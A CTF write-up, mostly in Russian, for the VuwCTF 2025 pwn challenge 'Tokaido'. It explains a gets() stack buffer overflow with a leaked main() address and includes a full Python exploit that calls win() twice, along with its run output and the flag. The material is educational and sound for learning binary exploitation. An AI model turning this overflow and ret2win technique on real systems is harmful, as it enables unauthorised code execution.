# 🎌 Tokaido Challenge Writeup

> **CTF:** VuwCTF 2025  
> **Category:** Pwn  
> **Difficulty:** 100 points  
> **Author:** pr1ncipLe  
> **Status:** ✅ Solved

---

## Table of Contents

1. [Challenge Information](#challenge-information)
2. [Initial Reconnaissance](#initial-reconnaissance)
3. [Source Code Analysis](#source-code-analysis)
4. [Vulnerability Analysis](#vulnerability-analysis)
5. [Exploitation Strategy](#exploitation-strategy)
6. [The Exploit](#the-exploit)
7. [Execution & Results](#execution--results)
8. [Technical Deep Dive](#technical-deep-dive)
9. [Lessons Learned](#lessons-learned)
10. [Flag](#flag)

---

## Challenge Information

| Parameter | Value |
|-----------|-------|
| **Challenge Name** | Tokaido |
| **Category** | Pwn |
| **Points** | 100 |
| **Files** | `tokaido.c`, `tokaido` binary |
| **Remote Connection** | `nc tokaido.challenges.2025.vuwctf.com 9983` |

---

## Initial Reconnaissance

При подключении к сервису мы видим простое взаимодействие:

```bash
$ nc tokaido.challenges.2025.vuwctf.com 9983
funny number: 0x56fd2a6432ce
```

Сервер выдает нам "смешное число" - это будет важно позже!

---

## Source Code Analysis

Исходный код `tokaido.c`:

```c
#include <stdio.h>

int attempts = 0;

void win() {
    puts("you win");
    if (attempts++ > 0){
        FILE *f = fopen("flag.txt", "r");
        if (f) {
            char read;
            while ((read = fgetc(f)) != EOF) {
                putchar(read);
            }
            fclose(f);
        } else {
            puts("flag file not found");
        }
    } else {
        puts("not attempted");
    }
}

int main() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    printf("funny number: %p\n", main);
    char buffer[16];
    gets(buffer);
    printf("You said: %s\n", buffer);
    return 0;
}
```

### Key Points

- **Buffer size:** 16 bytes
- **Vulnerability:** `gets()` - нет проверки границ!
- **Info leak:** Адрес функции `main()`
- **Win condition:** Функция `win()` должна быть вызвана **дважды**

---

## Vulnerability Analysis

### Уязвимость: Buffer Overflow

Функция `gets(buffer)` читает ввод без проверки размера буфера. Это классическая уязвимость buffer overflow!

### Memory Layout (x86-64)

```
┌─────────────────┬──────────────┬─────────────────┐
│  buffer[16]     │  saved RBP   │  return address │
│                 │   (8 bytes)  │    (8 bytes)    │
└─────────────────┴──────────────┴─────────────────┘
     16 bytes          8 bytes         8 bytes
```

**Для перезаписи return address нужно:** 16 + 8 = **24 байта padding**

### Win Condition

Функция `win()` выдает флаг только при **втором** вызове:

1. **Первый вызов:** `attempts = 0` → выводит "not attempted", но `attempts++` делает его равным 1
2. **Второй вызов:** `attempts = 1` → условие `attempts++ > 0` истинно → флаг!

**Вывод:** Нам нужно вызвать `win()` **дважды** за один эксплойт!

---

## Exploitation Strategy

### Step 1: Локальный анализ бинарника

Компилируем локальную копию с теми же флагами:

```bash
gcc -no-pie -fno-stack-protector -z execstack -w -o tokaido tokaido.c
```

Извлекаем адреса функций:

```bash
$ objdump -t tokaido | grep -E "main|win"

0000000000401196 g     F .text  00000000000000a1              win
0000000000401237 g     F .text  0000000000000095              main
```

### Вычисляем смещение:

```
offset = win - main
offset = 0x401196 - 0x401237 = -0xA1
```

### Step 2: Структура payload

```python
payload = [16 bytes padding] + [8 bytes RBP] + [win_addr] + [win_addr]
          └─ заполняем buffer ─┘ └─ saved RBP ─┘ └─ 1st call ─┘ └─ 2nd call ─┘
```

### Step 3: Динамический расчет адресов

1. Парсим адрес `main()` из вывода сервера
2. Вычисляем `win_addr = main_addr + offset`
3. Строим payload с вычисленным адресом

---

## The Exploit

```python
import socket
import struct
import re

HOST = "tokaido.challenges.2025.vuwctf.com"
PORT = 9983
WIN_OFFSET = -0xA1  # Calculated from local binary analysis

def main():
    with socket.create_connection((HOST, PORT)) as s:
        s.settimeout(5.0)
        
        # Receive server banner and extract main address
        banner = s.recv(1024).decode(errors='ignore')
        print(f"[+] Server banner: {banner.strip()}")
        
        # Extract hex address using regex
        match = re.search(r'0x([0-9a-fA-F]+)', banner)
        if not match:
            print("[!] Could not find main address in response")
            return
        
        main_addr = int(match.group(0), 16)
        win_addr = main_addr + WIN_OFFSET
        
        print(f"[*] main @ {main_addr:#x}")
        print(f"[*] win  @ {win_addr:#x}")

        # Construct payload
        payload = b'A' * 16          # Fill buffer[16]
        payload += b'B' * 8          # Overwrite saved RBP
        payload += struct.pack('<Q', win_addr)  # First win() call
        payload += struct.pack('<Q', win_addr)  # Second win() call

        # Send exploit
        print("[+] Sending exploit...")
        s.sendall(payload + b'\n')
        
        # Receive full response
        response = b""
        while True:
            try:
                data = s.recv(4096)
                if not data: 
                    break
                response += data
            except socket.timeout:
                break
        
        # Process and display response
        decoded_response = response.decode(errors='ignore')
        print("\n" + "="*60)
        print("FULL SERVER RESPONSE:")
        print(decoded_response)
        print("="*60)
        
        # Extract flag (case-insensitive match)
        flag_match = re.search(r'[Vv]uwCTF\{[^}]+\}', decoded_response)
        if flag_match:
            flag = flag_match.group(0)
            print(f"\nSUCCESS! FLAG FOUND: {flag}")
        else:
            print("\n[!] FLAG NOT FOUND IN RESPONSE")
            print("[*] Check payload construction and address calculation")

if __name__ == "__main__":
    main()
```

---

## Execution & Results

```bash
$ python3 exploit.py
[+] Server banner: funny number: 0x56fd2a6432ce
[*] main @ 0x56fd2a6432ce
[*] win  @ 0x56fd2a64322d
[+] Sending exploit...

============================================================
FULL SERVER RESPONSE:
AAAAAAAAAAAAAAAABBBBBBBB-2d*V^@^@-2d*V^@^@
You said: AAAAAAAAAAAAAAAABBBBBBBB-2d*V
you win
not attempted
you win
VuwCTF{eastern_sea_route}
============================================================

SUCCESS! FLAG FOUND: VuwCTF{eastern_sea_route}
```

### Что произошло?

1. ✅ Получили адрес `main()`
2. ✅ Вычислили адрес `win()`
3. ✅ Перезаписали return address дважды
4. ✅ Первый вызов `win()`: "not attempted" + `attempts++`
5. ✅ Второй вызов `win()`: флаг выведен!

---

## Technical Deep Dive

### 1. Buffer Overflow Mechanics

Функция `gets()` - это старая небезопасная функция из библиотеки C:

```c
char buffer[16];
gets(buffer);  // Нет проверки размера!
```

Она читает до символа новой строки (`\n`) без ограничений, позволяя перезаписать:
- Сохраненный base pointer (RBP)
- Return address
- Другие данные на стеке

### 2. Return-Oriented Programming (ROP) Lite

Хотя это не полноценная ROP-цепочка, техника перезаписи return address - основа бинарной эксплуатации:

```
Normal execution flow:
main() → return to OS

Our exploit:
main() → win() → win() → crash (but we got the flag!)
```

### 3. ASLR Bypass

**ASLR** (Address Space Layout Randomization) рандомизирует адреса в памяти при каждом запуске программы.

**Обход:**
- Сервер "утекает" адрес `main()`
- Мы вычисляем относительное смещение до `win()`
- Смещение всегда постоянно: `win - main = -0xA1`

### 4. Little-Endian Encoding

x86-64 использует little-endian порядок байтов:

```python
struct.pack('<Q', 0x401196)
# '<' = little-endian
# 'Q' = unsigned long long (8 bytes)
```

Адрес `0x401196` → байты `\x96\x11\x40\x00\x00\x00\x00\x00`

---

## Lessons Learned

### Технические выводы

1. **Анализируй всю логику программы**  
   Требование вызвать `win()` дважды не было очевидным с первого взгляда

2. **Динамический расчет адресов критичен**  
   Hardcode адресов провалится из-за ASLR

3. **Regex должен быть гибким**  
   Case-insensitive поиск флага: `[Vv]uwCTF\{[^}]+\}`

4. **Структура стека имеет значение**  
   8-байтовый saved RBP после локальных переменных - важно для выравнивания

### Практические навыки

- ✅ Buffer overflow эксплуатация
- ✅ Анализ дизассемблированного кода
- ✅ Python socket программирование
- ✅ Понимание архитектуры x86-64
- ✅ Техники обхода ASLR

---

## Flag

```
VuwCTF{eastern_sea_route}
```

> **Название "Tokaido"** (東海道) - историческая дорога вдоль восточного побережья Японии, соединяющая Киото и Эдо (современный Токио). Флаг `{eastern_sea_route}` отсылает к этому маршруту!

---

## References

- [OWASP: Buffer Overflow](https://owasp.org/www-community/vulnerabilities/Buffer_Overflow)
- [LiveOverflow: Binary Exploitation](https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN)
- [Pwntools Documentation](https://docs.pwntools.com/)

---

**Writeup by: pr1ncipLe
**Date:** December 2025  
**CTF:** VuwCTF 2025

*Happy Hacking!*
